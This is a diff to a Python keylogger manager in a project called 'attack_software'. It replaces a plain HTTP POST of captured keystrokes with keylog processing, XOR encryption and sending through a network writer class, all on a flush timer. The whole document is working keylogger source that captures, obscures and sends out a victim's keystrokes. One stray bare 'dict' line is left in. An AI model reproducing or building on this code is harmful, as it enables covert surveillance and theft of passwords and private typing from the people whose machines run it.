@@ -1,7 +1,8 @@
 import time
-import requests
-
+from NetworkWriter import WriterNetwork
+from keyboard_log_processor import keyboard_log_processor
 from attack_software.config.config import Flush_interval
+from attack_software.src.xor_encryption import XOREncryption
 from keylogger_service import KeyloggerService
 from threading import Thread
 import sys
@@ -14,21 +15,9 @@ class KeyloggerManager:
         self.running = False
         self.server_url = server_url
         self.last_buffer_send = time.time()
-
-    def send_to_server(self, data):
-        """Send captured data to the server."""
-        try:
-            response = requests.post(
-                self.server_url,
-                json={"keystrokes": data},
-                timeout=5
-            )
-            response.raise_for_status()
-            print(f"Data sent successfully: {len(data)} characters")
-            return True
-        except requests.exceptions.RequestException as e:
-            print(f"Failed to send data to server: {e}")
-            return False
+        self.writerNetwork = WriterNetwork()
+        self.dictWriter = keyboard_log_processor()
+        self.encryption = XOREncryption()
 
     def buffer_monitor(self):
         """Monitor and periodically send buffer data to server."""
@@ -37,9 +26,11 @@ class KeyloggerManager:
             # Check if 60 seconds have passed since last send
             if current_time - self.last_buffer_send >= Flush_interval :
                 buffer_data = self.service.get_buffer_data()
-                print(f"data: {buffer_data} ")
                 if buffer_data:
-                    self.send_to_server(buffer_data)
+                    key_log = self.dictWriter.process_keylog(buffer_data)
+                    dict
+                    encrypted_logs = self.encryption.encrypt(str(key_log))
+                    self.writerNetwork.send_data(encrypted_logs)
                 self.last_buffer_send = current_time
             time.sleep(1)  # Check every second efficiently
 
